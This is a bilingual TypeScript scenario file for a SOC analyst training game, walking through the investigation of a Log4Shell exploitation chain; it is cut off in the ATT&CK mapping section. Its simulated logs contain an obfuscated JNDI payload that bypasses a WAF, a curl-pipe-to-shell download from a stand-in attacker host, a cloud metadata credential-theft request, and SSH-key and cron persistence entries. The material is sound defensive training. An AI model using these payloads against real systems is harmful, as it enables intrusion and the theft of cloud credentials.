import type { Scenario } from '../types/scenario';

/**
 * LEVEL 2 — Tier 2 investigation on a Log4Shell-style exploitation chain.
 *
 * Teaching goals: correlate four unrelated sources into one story, tell a
 * mitigation from a fix, and remember that stolen cloud credentials outlive
 * the host they were stolen from.
 *
 * External IPs use RFC 5737 documentation ranges.
 */
export const level2: Scenario = {
  id: 'l2-log4shell',
  code: 'LVL-02',
  difficulty: 2,
  title: {
    fr: "Le JNDI dans l'en-tête",
    en: 'The JNDI in the header',
  },
  subtitle: {
    fr: "Exploitation d'une vulnérabilité publique sur un serveur exposé",
    en: 'Public-facing exploitation of an internet-exposed server',
  },
  role: {
    fr: 'Analyste L2 — investigation et corrélation, garde de nuit',
    en: 'Tier 2 analyst — investigation and correlation, night shift',
  },
  durationMin: 18,
  tags: ['Log4Shell', 'CVE-2021-44228', 'T1190', 'Cloud', 'Corrélation'],

  realCase: {
    name: {
      fr: 'Log4Shell — CVE-2021-44228, décembre 2021',
      en: 'Log4Shell — CVE-2021-44228, December 2021',
    },
    summary: {
      fr: "Le 9 décembre 2021, une vulnérabilité critique est divulguée dans Apache Log4j 2 : toute chaîne journalisée contenant une expression JNDI (par exemple ${jndi:ldap://…}) provoque une résolution distante et, avec les versions vulnérables, l'exécution de code à distance. Le score CVSS est de 10.0, la bibliothèque est présente dans des dizaines de milliers de produits, et le scan de masse a commencé dans les heures suivant la publication. Ce niveau reprend le schéma le plus fréquent observé alors : une chaîne d'exploitation qui passe par un en-tête HTTP secondaire, suivie d'un vol d'identifiants d'instance cloud.",
      en: 'On 9 December 2021 a critical flaw was disclosed in Apache Log4j 2: any logged string containing a JNDI expression (for instance ${jndi:ldap://…}) triggers a remote lookup and, on vulnerable versions, remote code execution. CVSS 10.0, the library shipped inside tens of thousands of products, and mass scanning started within hours of publication. This level reproduces the pattern seen most often at the time: an exploitation chain arriving through a secondary HTTP header, followed by cloud instance credential theft.',
    },
    references: [
      {
        source: 'NVD',
        label: { fr: 'CVE-2021-44228 — fiche NVD', en: 'CVE-2021-44228 — NVD entry' },
        url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
      },
      {
        source: 'CISA',
        label: {
          fr: 'Avis CISA AA21-356A — Mitiger Log4Shell',
          en: 'CISA Advisory AA21-356A — Mitigating Log4Shell',
        },
        // TODO: vérifier l'URL exacte (identifiant AA21-356A confirmé, chemin du site CISA susceptible d'évoluer).
        url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a',
      },
      {
        source: 'Apache',
        label: {
          fr: 'Apache Log4j — page de sécurité officielle',
          en: 'Apache Log4j — official security page',
        },
        // TODO: vérifier l'URL exacte de la page sécurité Log4j 2.x.
        url: 'https://logging.apache.org/log4j/2.x/security.html',
      },
      {
        source: 'MITRE ATT&CK',
        label: {
          fr: "T1190 — Exploitation d'une application exposée",
          en: 'T1190 — Exploit Public-Facing Application',
        },
        url: 'https://attack.mitre.org/techniques/T1190/',
      },
    ],
  },

  environment: {
    summary: {
      fr: "Mireno Retail, plateforme e-commerce. Le front catalogue tourne sur WEB-PROD-03, une instance Linux en DMZ (Tomcat 9, Java 8), derrière un WAF. L'instance porte un rôle cloud « role-web-prod » qui lui donne accès à deux buckets de stockage. Agent EDR Linux, collecte syslog et journaux WAF dans le SIEM. Il est 3 h 14, vous êtes de garde.",
      en: 'Mireno Retail, e-commerce platform. The catalogue front-end runs on WEB-PROD-03, a Linux instance in the DMZ (Tomcat 9, Java 8) behind a WAF. The instance carries a cloud role, "role-web-prod", granting access to two storage buckets. Linux EDR agent, syslog and WAF logs shipped to the SIEM. It is 03:14 and you are on shift.',
    },
    assets: [
      { name: 'WEB-PROD-03', role: { fr: 'Front catalogue, Tomcat 9 / Java 8, DMZ', en: 'Catalogue front-end, Tomcat 9 / Java 8, DMZ' } },
      { name: 'WAF-EDGE', role: { fr: 'Pare-feu applicatif en coupure', en: 'Inline web application firewall' } },
      { name: 'APP-INT-02', role: { fr: 'Serveur applicatif interne', en: 'Internal application server' } },
      { name: 'role-web-prod', role: { fr: "Rôle cloud porté par l'instance", en: 'Cloud role attached to the instance' } },
    ],
    telemetry: [
      { fr: 'Journaux WAF et accès HTTP', en: 'WAF and HTTP access logs' },
      { fr: 'EDR Linux (exécutions, connexions)', en: 'Linux EDR (process, network)' },
      { fr: 'Flux réseau sortants (NetFlow)', en: 'Outbound network flows (NetFlow)' },
      { fr: "Journaux d'API cloud", en: 'Cloud API audit logs' },
      { fr: 'syslog, auth.log, cron', en: 'syslog, auth.log, cron' },
      { fr: 'Inventaire applicatif / SBOM', en: 'Application inventory / SBOM' },
    ],
  },

  perfectBadge: 'perfect-l2',

  phases: [
    /* ---------------------------------------------------------------- */
    {
      kind: 'briefing',
      id: 'l2-brief',
      title: { fr: 'Prise de poste', en: 'Shift handover' },
      content: {
        fr: "3 h 14. Une règle de détection réseau vient de se déclencher : le serveur web du catalogue a ouvert une session LDAP vers une adresse publique. Rien d'autre n'a bougé dans la file. Le service fonctionne, la supervision est au vert, personne n'est réveillé. C'est précisément le type d'alerte que l'on découvre le lendemain matin quand on la laisse passer — et le type d'alerte dont dépendent ensuite trois semaines de réponse à incident.",
        en: 'It is 03:14. A network detection rule just fired: the catalogue web server opened an LDAP session towards a public address. Nothing else is moving in the queue. The service is up, monitoring is green, nobody is awake. This is exactly the kind of alert you find the next morning if you let it slide — and the kind that otherwise decides the next three weeks of incident response.',
      },
      objectives: [
        { fr: "Comprendre pourquoi ce flux sortant est anormal.", en: 'Understand why this outbound flow is abnormal.' },
        { fr: "Corréler WAF, EDR, réseau et journaux cloud en une seule histoire.", en: 'Correlate WAF, EDR, network and cloud logs into one story.' },
        { fr: "Identifier ce que l'attaquant a obtenu, au-delà du serveur.", en: 'Identify what the attacker gained beyond the server itself.' },
        { fr: 'Distinguer contournement temporaire et correction réelle.', en: 'Tell a temporary mitigation from a real fix.' },
      ],
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'alert',
      id: 'l2-triage',
      title: { fr: "Triage de l'alerte", en: 'Alert triage' },
      alert: {
        id: 'ALR-2026-0922-0039',
        ts: '2026-09-22 03:14:02',
        severity: 'high',
        source: 'SIEM · NetFlow correlation',
        rule: 'net_outbound_ldap_from_dmz_server',
        title: {
          fr: "Connexion LDAP sortante depuis un serveur web en DMZ",
          en: 'Outbound LDAP connection from a DMZ web server',
        },
        fields: [
          { key: 'SourceHost', value: 'WEB-PROD-03' },
          { key: 'Process', value: '/usr/lib/jvm/java-8-openjdk/bin/java' },
          { key: 'DestinationIP', value: '203.0.113.77' },
          { key: 'DestinationPort', value: '1389/tcp' },
          { key: 'Protocol', value: 'LDAP' },
          { key: 'Direction', value: 'outbound (DMZ → Internet)' },
        ],
        raw: 'flow: 10.20.5.33:51244 → 203.0.113.77:1389 proto=tcp bytes_out=612 bytes_in=1184 duration=0.42s app=ldap',
      },
      questions: [
        {
          id: 'l2-q-why-odd',
          points: 12,
          multi: true,
          prompt: {
            fr: "Qu'est-ce qui rend ce flux anormal ? Cochez les raisons valables.",
            en: 'What makes this flow abnormal? Tick the valid reasons.',
          },
          options: [
            {
              id: 'no-reason',
              label: {
                fr: "Un serveur web en DMZ n'a aucune raison d'initier une session LDAP vers Internet.",
                en: 'A DMZ web server has no reason to initiate an LDAP session towards the internet.',
              },
            },
            {
              id: 'port',
              label: {
                fr: 'Le port 1389 n’est pas un port d’annuaire d’entreprise (389, 636 en interne).',
                en: 'Port 1389 is not a corporate directory port (389, 636 internally).',
              },
            },
            {
              id: 'public-dest',
              label: {
                fr: 'La destination est une adresse publique, hors du périmètre de l’entreprise.',
                en: 'The destination is a public address, outside the company perimeter.',
              },
            },
            {
              id: 'ldap-evil',
              label: {
                fr: 'LDAP est un protocole obsolète, sa seule présence est malveillante.',
                en: 'LDAP is an obsolete protocol, its mere presence is malicious.',
              },
              feedback: {
                fr: "LDAP est parfaitement légitime : c'est l'épine dorsale de l'annuaire d'entreprise. Ce qui compte ici, c'est le sens du flux et la destination, pas le protocole.",
                en: 'LDAP is perfectly legitimate: it is the backbone of corporate directories. What matters here is the direction and destination of the flow, not the protocol.',
              },
            },
            {
              id: 'java',
              label: {
                fr: 'Le serveur exécute Java, ce qui est en soi un signal de compromission.',
                en: 'The server runs Java, which is a compromise signal in itself.',
              },
              feedback: {
                fr: "Le langage n'est pas un indicateur. C'est le comportement du processus java — une résolution LDAP sortante — qui l'est.",
                en: 'The language is not an indicator. The behaviour of the java process — an outbound LDAP lookup — is.',
              },
            },
          ],
          correct: ['no-reason', 'port', 'public-dest'],
          explanation: {
            fr: "Une détection réseau se juge sur trois axes : qui parle (un serveur applicatif en DMZ, qui ne devrait initier que des flux vers sa base et ses dépendances), à qui (une adresse publique non référencée), et comment (un port d'annuaire non standard). Les deux pièges sont des raccourcis de pensée : condamner un protocole, ou condamner une technologie. Un bon rapport d'incident ne contient ni l'un ni l'autre.",
            en: 'A network detection is judged on three axes: who is talking (a DMZ application server, which should only initiate flows to its database and dependencies), to whom (an unreferenced public address), and how (a non-standard directory port). The two traps are thinking shortcuts: condemning a protocol, or condemning a technology. A good incident report contains neither.',
          },
        },
        {
          id: 'l2-q-hypothesis',
          points: 10,
          prompt: {
            fr: 'Quelle hypothèse testez-vous en priorité ?',
            en: 'Which hypothesis do you test first?',
          },
          hint: {
            fr: "Demandez-vous ce qui, dans une application Java, peut déclencher une requête LDAP sans qu'aucun développeur ne l'ait voulu.",
            en: 'Ask yourself what, inside a Java application, can trigger an LDAP lookup that no developer ever intended.',
          },
          options: [
            {
              id: 'exploit',
              label: {
                fr: "Une exploitation applicative : une chaîne contrôlée par l'attaquant est journalisée et déclenche une résolution JNDI.",
                en: 'Application exploitation: an attacker-controlled string gets logged and triggers a JNDI lookup.',
              },
            },
            {
              id: 'exfil',
              label: {
                fr: 'Une exfiltration de données déguisée en trafic LDAP.',
                en: 'Data exfiltration disguised as LDAP traffic.',
              },
              feedback: {
                fr: "Plausible en théorie, mais 612 octets sortants ne sont pas une exfiltration. Le volume et la brièveté de la session pointent vers une résolution, pas un transfert.",
                en: 'Plausible in theory, but 612 outbound bytes are not exfiltration. The volume and the brevity of the session point to a lookup, not a transfer.',
              },
            },
            {
              id: 'misconfig',
              label: {
                fr: "Une erreur de configuration de l'annuaire interne.",
                en: 'A misconfiguration of the internal directory.',
              },
              feedback: {
                fr: "Hypothèse légitime à écarter en trente secondes — sauf qu'une erreur de configuration pointerait vers une IP interne, jamais vers une adresse publique inconnue.",
                en: 'A legitimate hypothesis to rule out in thirty seconds — except a misconfiguration would point at an internal IP, never at an unknown public address.',
              },
            },
            {
              id: 'scan',
              label: {
                fr: 'Un scan de ports sortant depuis le serveur.',
                en: 'An outbound port scan from the server.',
              },
              feedback: {
                fr: "Un scan génère de nombreuses connexions courtes vers des destinations variées. Ici : une destination, un port, une session aboutie avec réponse.",
                en: 'A scan generates many short connections to varied destinations. Here: one destination, one port, one completed session with a reply.',
              },
            },
          ],
          correct: ['exploit'],
          explanation: {
            fr: "Le raisonnement tient en une phrase : un processus applicatif qui résout un nom LDAP vers l'extérieur, sans qu'aucun code métier ne le prévoie, est presque toujours le symptôme d'une injection dans une donnée journalisée. C'est la signature de Log4Shell. Formuler l'hypothèse la plus économique — celle qui explique le plus d'observations avec le moins de suppositions — avant d'aller chercher la preuve dans les logs applicatifs : c'est ça, l'investigation L2.",
            en: 'The reasoning fits in one sentence: an application process resolving an LDAP name outbound, with no business code asking for it, is almost always the symptom of an injection into logged data. That is the Log4Shell signature. Forming the most economical hypothesis — the one explaining the most observations with the fewest assumptions — before going to the application logs for proof: that is Tier 2 investigation.',
          },
        },
      ],
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'investigation',
      id: 'l2-investigation',
      title: { fr: 'Investigation', en: 'Investigation' },
      minPivots: 5,
      intro: {
        fr: "Quatre sources à croiser, un serveur qui tourne toujours et une hypothèse à confirmer. À vous de choisir l'ordre — mais souvenez-vous qu'au niveau 2, la question n'est plus « est-ce vrai ? » mais « jusqu'où ça va ? ».",
        en: 'Four sources to cross-reference, a server still running and a hypothesis to confirm. Your call on the order — but remember that at Tier 2 the question is no longer "is it real?" but "how far did it go?".',
      },
      pivots: [
        {
          id: 'l2-p-waf',
          relevant: true,
          points: 12,
          label: { fr: 'Fouiller les journaux WAF et HTTP', en: 'Dig into the WAF and HTTP logs' },
          rationale: {
            fr: "Si une chaîne d'attaque a été journalisée par l'application, elle est passée par une requête HTTP. Le WAF a tout vu — reste à savoir ce qu'il a laissé passer.",
            en: 'If an attack string got logged by the application, it arrived in an HTTP request. The WAF saw everything — the question is what it let through.',
          },
          query: 'index=waf host=WEB-PROD-03 earliest="09/22/2026:02:30:00" ("${jndi" OR "jndi:" OR "${${")',
          logs: [
            {
              id: 'l2-log-waf-1',
              ts: '2026-09-22 02:41:17',
              source: 'WAF-EDGE',
              severity: 'medium',
              fields: [
                { key: 'Rule', value: 'JNDI_LOOKUP_PATTERN' },
                { key: 'Action', value: 'BLOCK' },
                { key: 'Count', value: '4 127 requêtes / 31 min' },
                { key: 'Fields', value: 'User-Agent, URI, Referer, X-Forwarded-For' },
                { key: 'SourceIPs', value: '87 adresses distinctes' },
              ],
              note: {
                fr: 'Scan de masse classique : de nombreuses sources testent les emplacements « évidents ». Le WAF fait son travail.',
                en: 'Classic mass scanning: many sources probing the "obvious" locations. The WAF is doing its job.',
              },
            },
            {
              id: 'l2-log-waf-2',
              ts: '2026-09-22 03:02:48',
              source: 'WAF-EDGE',
              severity: 'critical',
              fields: [
                { key: 'Rule', value: 'JNDI_LOOKUP_PATTERN' },
                { key: 'Action', value: 'ALLOW (no match)' },
                { key: 'SourceIP', value: '203.0.113.77' },
                { key: 'Method', value: 'GET /catalogue/api/v2/items?page=1' },
                { key: 'X-Api-Version', value: '${${lower:j}ndi:${lower:l}dap://203.0.113.77:1389/a}' },
                { key: 'HTTPStatus', value: '200' },
              ],
              note: {
                fr: "Deux évasions combinées : un en-tête personnalisé que la signature n'inspecte pas, et une obfuscation par ${lower:…} qui casse la correspondance littérale « ${jndi: ».",
                en: 'Two evasions combined: a custom header the signature does not inspect, and ${lower:…} obfuscation breaking the literal "${jndi:" match.',
              },
            },
          ],
          finding: {
            fr: "Une requête sur 4 128 est passée. Elle vient de la même adresse que la destination LDAP — l'attaquant n'est pas un scanner opportuniste, il est revenu avec une charge adaptée. L'en-tête X-Api-Version est journalisé par l'application, donc évalué par Log4j.",
            en: 'One request out of 4,128 got through. It comes from the same address as the LDAP destination — this attacker is not an opportunistic scanner, they came back with a tailored payload. The X-Api-Version header is logged by the application, therefore evaluated by Log4j.',
          },
          iocs: [
            { type: 'ip', value: '203.0.113.77' },
            { type: 'url', value: 'ldap://203.0.113.77:1389/a' },
          ],
        },
        {
          id: 'l2-p-proc',
          relevant: true,
          points: 12,
          label: { fr: "Dérouler l'arbre de processus sur le serveur", en: 'Unroll the process tree on the server' },
          rationale: {
            fr: "Une résolution JNDI seule ne prouve pas l'exécution de code. Un processus enfant sous Tomcat, si.",
            en: 'A JNDI lookup alone does not prove code execution. A child process under Tomcat does.',
          },
          query: 'index=edr host=WEB-PROD-03 event=process_create parent_name=java earliest="09/22/2026:03:00:00"',
          logs: [
            {
              id: 'l2-log-proc-1',
              ts: '2026-09-22 03:03:11',
              source: 'EDR Linux',
              host: 'WEB-PROD-03',
              severity: 'critical',
              fields: [
                { key: 'Parent', value: '/usr/lib/jvm/java-8-openjdk/bin/java (tomcat9)' },
                { key: 'Process', value: '/bin/sh -c "curl -s hxxp://203.0.113.77:8080/a.sh | sh"' },
                { key: 'UID', value: '997 (tomcat)' },
                { key: 'CWD', value: '/opt/tomcat9' },
              ],
              note: {
                fr: "Exécution de code confirmée : le serveur d'application lance un interpréteur shell. Aucun déploiement légitime ne fait ça à 3 h du matin.",
                en: 'Code execution confirmed: the application server spawns a shell interpreter. No legitimate deployment does that at 3 a.m.',
              },
            },
            {
              id: 'l2-log-proc-2',
              ts: '2026-09-22 03:06:40',
              source: 'EDR Linux',
              host: 'WEB-PROD-03',
              severity: 'high',
              fields: [
                { key: 'Process', value: '/bin/sh' },
                { key: 'Action', value: 'file_write' },
                { key: 'Target', value: '/home/tomcat/.ssh/authorized_keys' },
                { key: 'Detail', value: 'ssh-ed25519 AAAAC3NzaC1lZDI1…  build@ci' },
              ],
              note: {
                fr: "Clé publique ajoutée avec un commentaire crédible (« build@ci ») pour passer une relecture rapide.",
                en: 'Public key appended with a credible comment ("build@ci") so it survives a quick review.',
              },
            },
            {
              id: 'l2-log-proc-3',
              ts: '2026-09-22 03:06:52',
              source: 'EDR Linux',
              host: 'WEB-PROD-03',
              severity: 'high',
              fields: [
                { key: 'Process', value: 'crontab' },
                { key: 'Action', value: 'cron_write' },
                { key: 'Entry', value: '@reboot /usr/bin/flock -n /tmp/.lk /opt/.cache/kdevtmp' },
              ],
            },
            {
              id: 'l2-log-proc-4',
              ts: '2026-09-22 03:09:05',
              source: 'EDR Linux',
              host: 'WEB-PROD-03',
              severity: 'high',
              fields: [
                { key: 'Process', value: '/opt/.cache/kdevtmp' },
                { key: 'Args', value: '-o pool.example-mining[.]invalid:3333 --tls' },
                { key: 'CPU', value: '98 %' },
                { key: 'Signature', value: 'XMRig-like miner' },
              ],
            },
          ],
          finding: {
            fr: "Exécution de code, persistance double (clé SSH et cron @reboot) et mineur de cryptomonnaie. Le mineur est la partie visible : il fait du bruit, mais ce n'est pas lui qui coûtera le plus cher.",
            en: 'Code execution, double persistence (SSH key and @reboot cron) and a crypto miner. The miner is the visible part: it makes noise, but it is not what will cost the most.',
          },
          iocs: [
            { type: 'file', value: '/opt/.cache/kdevtmp' },
            { type: 'file', value: '/home/tomcat/.ssh/authorized_keys' },
            { type: 'task', value: '@reboot … /opt/.cache/kdevtmp' },
          ],
        },
        {
          id: 'l2-p-cloud',
          relevant: true,
          points: 14,
          awardsBadge: 'cloud-creds',
          label: { fr: "Suivre l'appel au service de métadonnées", en: 'Follow the metadata service call' },
          rationale: {
            fr: "Sur une instance cloud, la première chose que cherche un attaquant qui obtient l'exécution de code, ce sont les identifiants du rôle attaché — accessibles sans mot de passe depuis la machine.",
            en: 'On a cloud instance, the first thing an attacker with code execution looks for is the attached role credentials — reachable from the host without any password.',
          },
          query: 'index=edr host=WEB-PROD-03 dest_ip=169.254.169.254 OR index=cloudtrail user_identity.arn="*role-web-prod*"',
          logs: [
            {
              id: 'l2-log-cloud-1',
              ts: '2026-09-22 03:04:26',
              source: 'EDR Linux',
              host: 'WEB-PROD-03',
              severity: 'critical',
              fields: [
                { key: 'Process', value: 'curl' },
                { key: 'URL', value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/role-web-prod' },
                { key: 'HTTPStatus', value: '200' },
                { key: 'BytesIn', value: '1 204' },
              ],
              note: {
                fr: "Le service de métadonnées a répondu : des identifiants temporaires du rôle d'instance sont sortis de la machine.",
                en: 'The metadata service answered: temporary instance role credentials left the machine.',
              },
            },
            {
              id: 'l2-log-cloud-2',
              ts: '2026-09-22 03:07:58',
              source: 'Cloud API audit',
              severity: 'critical',
              fields: [
                { key: 'Identity', value: 'assumed-role/role-web-prod/i-0a4c9e' },
                { key: 'SourceIP', value: '203.0.113.77' },
                { key: 'Actions', value: 'GetCallerIdentity, ListBuckets, GetObject ×214' },
                { key: 'Bucket', value: 'mireno-catalog-media, mireno-invoices-archive' },
                { key: 'UserAgent', value: 'aws-cli/2.x Python/3.11 Linux' },
              ],
              note: {
                fr: "Les identifiants sont utilisés depuis l'adresse de l'attaquant, hors du cloud. C'est le point de bascule : la compromission ne se limite plus au serveur.",
                en: 'The credentials are being used from the attacker address, outside the cloud. This is the tipping point: the compromise is no longer limited to the server.',
              },
            },
          ],
          finding: {
            fr: "Les identifiants temporaires du rôle d'instance ont été volés puis utilisés depuis Internet pour lire 214 objets dans deux buckets, dont un contenant des archives de facturation. Isoler le serveur ne révoquera pas ces identifiants : il faut une action côté cloud.",
            en: 'The temporary instance role credentials were stolen and then used from the internet to read 214 objects from two buckets, one of them holding invoice archives. Isolating the server will not revoke those credentials: that takes a cloud-side action.',
          },
          iocs: [
            { type: 'account', value: 'assumed-role/role-web-prod/i-0a4c9e' },
            { type: 'ip', value: '203.0.113.77' },
          ],
        },
        {
          id: 'l2-p-sbom',
          relevant: true,
          points: 10,
          label: { fr: "Vérifier la version de la bibliothèque", en: 'Check the library version' },
          rationale: {
            fr: "Confirmer la vulnérabilité par l'inventaire, et comprendre pourquoi elle était encore là.",
            en: 'Confirm the vulnerability from the inventory, and understand why it was still there.',
          },
          query: 'index=inventory host=WEB-PROD-03 component="log4j*"',
          logs: [
            {
              id: 'l2-log-sbom-1',
              ts: '2026-09-22 03:18:00',
              source: 'Asset inventory / SBOM',
              host: 'WEB-PROD-03',
              severity: 'high',
              fields: [
                { key: 'Component', value: 'log4j-core-2.14.1.jar' },
                { key: 'Path', value: '/opt/tomcat9/webapps/catalogue/WEB-INF/lib/' },
                { key: 'CVE', value: 'CVE-2021-44228 (CVSS 10.0)' },
                { key: 'JavaVersion', value: '1.8.0_292' },
                { key: 'PatchTicket', value: 'CHG-8841 — planifié, non appliqué (dépendance transitive)' },
              ],
              note: {
                fr: "La bibliothèque n'est pas une dépendance directe : elle arrive par un composant tiers, ce qui explique qu'elle ait échappé au premier inventaire.",
                en: 'The library is not a direct dependency: it arrives through a third-party component, which is why it escaped the first inventory pass.',
              },
            },
          ],
          finding: {
            fr: "Version vulnérable confirmée, sur un serveur exposé, avec un ticket de correction ouvert mais non appliqué. C'est la cause racine technique de l'incident — et elle était connue.",
            en: 'Vulnerable version confirmed, on an exposed server, with a remediation ticket open but not applied. That is the technical root cause of the incident — and it was already known.',
          },
        },
        {
          id: 'l2-p-lateral',
          relevant: true,
          points: 12,
          label: { fr: 'Chercher le mouvement latéral', en: 'Look for lateral movement' },
          rationale: {
            fr: "Un serveur en DMZ a rarement de la valeur en soi. Ce qui compte, c'est ce qu'il permet d'atteindre.",
            en: 'A DMZ server is rarely valuable in itself. What matters is what it lets you reach.',
          },
          query: 'index=linux sourcetype=auth src_host=WEB-PROD-03 OR dest_host=APP-INT-02 earliest="09/22/2026:03:00:00"',
          logs: [
            {
              id: 'l2-log-lat-1',
              ts: '2026-09-22 03:41:19',
              source: 'auth.log',
              host: 'APP-INT-02',
              severity: 'critical',
              fields: [
                { key: 'Event', value: 'Accepted publickey for deploy' },
                { key: 'SourceIP', value: '10.20.5.33 (WEB-PROD-03)' },
                { key: 'KeyFingerprint', value: 'SHA256:9Lf3…qT4 (ed25519)' },
                { key: 'Port', value: '22' },
              ],
              note: {
                fr: "La même clé que celle ajoutée sur WEB-PROD-03 : elle était déjà autorisée sur APP-INT-02 pour le compte de déploiement. Une clé, deux serveurs.",
                en: 'The same key added on WEB-PROD-03: it was already authorised on APP-INT-02 for the deployment account. One key, two servers.',
              },
            },
            {
              id: 'l2-log-lat-2',
              ts: '2026-09-22 03:44:02',
              source: 'EDR Linux',
              host: 'APP-INT-02',
              severity: 'high',
              fields: [
                { key: 'Commands', value: 'id; hostname; cat /etc/passwd; ls -la /srv/app/config' },
                { key: 'User', value: 'deploy' },
                { key: 'Files', value: '/srv/app/config/database.yml (read)' },
              ],
            },
          ],
          finding: {
            fr: "L'attaquant a rebondi vers le réseau interne avec une clé de déploiement partagée, puis est allé lire un fichier de configuration contenant des identifiants de base de données. La DMZ n'a pas joué son rôle de cloisonnement.",
            en: 'The attacker pivoted into the internal network with a shared deployment key, then read a configuration file containing database credentials. The DMZ did not do its segmentation job.',
          },
          iocs: [{ type: 'account', value: 'deploy@APP-INT-02' }],
        },
        {
          id: 'l2-p-retro',
          relevant: true,
          points: 12,
          awardsBadge: 'hunt-wide',
          label: { fr: 'Chasser le même motif sur tout le parc exposé', en: 'Hunt the same pattern across the exposed estate' },
          rationale: {
            fr: "Si une signature a été contournée ici, elle l'a été partout. La question n'est pas si d'autres serveurs ont été visés, mais lesquels ont répondu.",
            en: 'If a signature was bypassed here, it was bypassed everywhere. The question is not whether other servers were targeted, but which ones answered.',
          },
          query: 'index=waf OR index=netflow ("${${" OR dest_port IN (1389,1099,389) AND src_zone=DMZ) earliest=-30d | stats count by src_host',
          logs: [
            {
              id: 'l2-log-retro-1',
              ts: '2026-09-22 04:02:11',
              source: 'SIEM retro-hunt',
              severity: 'high',
              fields: [
                { key: 'Window', value: '30 jours' },
                { key: 'HostsProbed', value: '9 serveurs exposés' },
                { key: 'OutboundLookups', value: 'WEB-PROD-03 uniquement' },
                { key: 'VulnerableComponents', value: 'WEB-PROD-03, WEB-PROD-07 (log4j-core-2.14.1)' },
                { key: 'FirstProbe', value: '2026-09-22 02:41 (aucune tentative antérieure)' },
              ],
              note: {
                fr: "WEB-PROD-07 porte la même bibliothèque vulnérable mais n'a jamais émis de résolution sortante : visé, pas exploité. À corriger en priorité avant qu'il ne le soit.",
                en: 'WEB-PROD-07 carries the same vulnerable library but never emitted an outbound lookup: targeted, not exploited. Patch it before it is.',
              },
            },
          ],
          finding: {
            fr: "Un seul serveur exploité, mais deux vulnérables. La chasse rétroactive transforme un incident en cartographie d'exposition — et c'est elle qui évite le deuxième incident la semaine suivante.",
            en: 'One server exploited, two vulnerable. Retro-hunting turns an incident into an exposure map — and that is what prevents the second incident next week.',
          },
        },
        {
          id: 'l2-p-noise',
          relevant: false,
          points: 0,
          label: {
            fr: 'Analyser les 4 127 tentatives bloquées une par une',
            en: 'Analyse the 4,127 blocked attempts one by one',
          },
          rationale: {
            fr: 'Le WAF a bloqué énormément de choses cette nuit. Peut-être un motif intéressant ?',
            en: 'The WAF blocked a lot tonight. Maybe there is an interesting pattern?',
          },
          query: 'index=waf action=BLOCK rule=JNDI_LOOKUP_PATTERN | table _time, src_ip, uri',
          logs: [
            {
              id: 'l2-log-noise-1',
              ts: '2026-09-22 02:41:17',
              source: 'WAF-EDGE',
              severity: 'info',
              fields: [
                { key: 'Result', value: '4 127 événements, 87 sources, 0 succès' },
                { key: 'Profile', value: 'scanners opportunistes, réseaux de masse' },
                { key: 'Payloads', value: 'identiques à 3 variantes près' },
              ],
            },
          ],
          finding: {
            fr: "Du bruit de fond Internet : des milliers de tentatives toutes bloquées, toutes identiques. Une seule requête compte dans cette nuit — celle qui est passée. Savoir ignorer le volume fait partie du métier.",
            en: 'Internet background noise: thousands of attempts, all blocked, all identical. Only one request matters tonight — the one that got through. Knowing when to ignore volume is part of the job.',
          },
        },
      ],
      question: {
        id: 'l2-q-bypass',
        points: 12,
        prompt: {
          fr: 'Le WAF a bloqué 4 127 tentatives et en a laissé passer une. Pourquoi ?',
          en: 'The WAF blocked 4,127 attempts and let one through. Why?',
        },
        options: [
          {
            id: 'header-and-obfuscation',
            label: {
              fr: "La signature n'inspectait qu'un ensemble limité de champs, et la charge utile était obfusquée pour ne pas correspondre littéralement.",
              en: 'The signature only inspected a limited set of fields, and the payload was obfuscated so it would not match literally.',
            },
          },
          {
            id: 'waf-down',
            label: { fr: 'Le WAF était en panne à ce moment-là.', en: 'The WAF was down at that moment.' },
            feedback: {
              fr: "Le journal montre « ALLOW (no match) » : le WAF a bien vu la requête et l'a évaluée. Il ne l'a simplement pas reconnue.",
              en: 'The log says "ALLOW (no match)": the WAF did see the request and evaluated it. It simply did not recognise it.',
            },
          },
          {
            id: 'https',
            label: {
              fr: "La requête était chiffrée en HTTPS, donc invisible pour le WAF.",
              en: 'The request was HTTPS-encrypted, therefore invisible to the WAF.',
            },
            feedback: {
              fr: "Le WAF est en coupure et déchiffre le trafic — c'est d'ailleurs comme ça qu'il a bloqué les 4 127 autres.",
              en: 'The WAF is inline and decrypts the traffic — that is precisely how it blocked the other 4,127.',
            },
          },
          {
            id: 'detect-mode',
            label: {
              fr: "La règle était en mode détection seule.",
              en: 'The rule was in detection-only mode.',
            },
            feedback: {
              fr: 'Les autres événements portent « Action: BLOCK » : la règle bloquait réellement. Le problème est sa couverture, pas son mode.',
              en: 'The other events carry "Action: BLOCK": the rule really was blocking. The problem is its coverage, not its mode.',
            },
          },
        ],
        correct: ['header-and-obfuscation'],
        explanation: {
          fr: "Deux leçons en une. D'abord, une signature ne protège que ce qu'elle inspecte : ici, User-Agent, URI, Referer et X-Forwarded-For, mais pas les en-têtes applicatifs personnalisés — or l'application journalisait X-Api-Version. Ensuite, une correspondance littérale se contourne : ${${lower:j}ndi:…} est fonctionnellement identique à ${jndi:…} pour Log4j, mais ne ressemble à rien pour une règle qui cherche une chaîne exacte. C'est exactement pour cette raison qu'un WAF est une mesure de contournement temporaire, jamais un correctif.",
          en: 'Two lessons in one. First, a signature only protects what it inspects: here User-Agent, URI, Referer and X-Forwarded-For, but not custom application headers — and the application logged X-Api-Version. Second, literal matching can be bypassed: ${${lower:j}ndi:…} is functionally identical to ${jndi:…} for Log4j, yet looks like nothing to a rule searching for an exact string. That is exactly why a WAF is a temporary mitigation, never a fix.',
        },
      },
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'mitre',
      id: 'l2-mitre',
      title: { fr: 'Mapping ATT&CK', en: 'ATT&CK mapping' },
      intro: {
        fr: "Sept techniques sont démontrées par vos journaux, trois ne le sont pas. Sur un incident cloud, le mapping sert aussi à montrer au métier que l'impact dépasse la machine : une technique de vol d'identifiants dans un rapport change la conversation.",
        en: 'Seven techniques are demonstrated by your logs, three are not. On a cloud incident, mapping also shows the business that the impact goes beyond the machine: a credential-theft technique in a report changes the conversation.',
      },
      techniques: [
        {
          id: 'T1190',
          name: { fr: "Exploitation d'une application exposée", en: 'Exploit Public-Facing Application' },
          tactic: 'initial-access',
          url: 'https://attack.mitre.org/techniques/T1190/',
          observed: true,
